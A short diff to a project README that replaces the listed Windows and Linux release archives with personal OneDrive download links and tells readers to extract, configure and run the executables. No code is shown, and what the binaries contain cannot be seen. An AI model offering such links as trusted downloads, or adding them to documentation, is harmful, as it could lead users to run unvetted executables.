@@ -30,8 +30,10 @@ Refer to those files for installation, configuration, and usage details.
 
 Binary‑only releases are provided:
 
-- Windows `.zip`
-- Linux `.tar.gz`
+- Windows
+https://1drv.ms/u/c/306f1b47acf88caf/IQBC_k39NXGDTJQl9ibClDw0AXEVAKfJIDCDtKce56Cze_s?e=MBZ5j7
+- Linux
+https://1drv.ms/u/c/306f1b47acf88caf/IQAiEc5FEb-eS5NWFJO9IkY1AUPl7lTDH9Sfi5lfKxAnbpM?e=lgTqxJ
 
 Extract,Configure and run the executables for your platform.
 
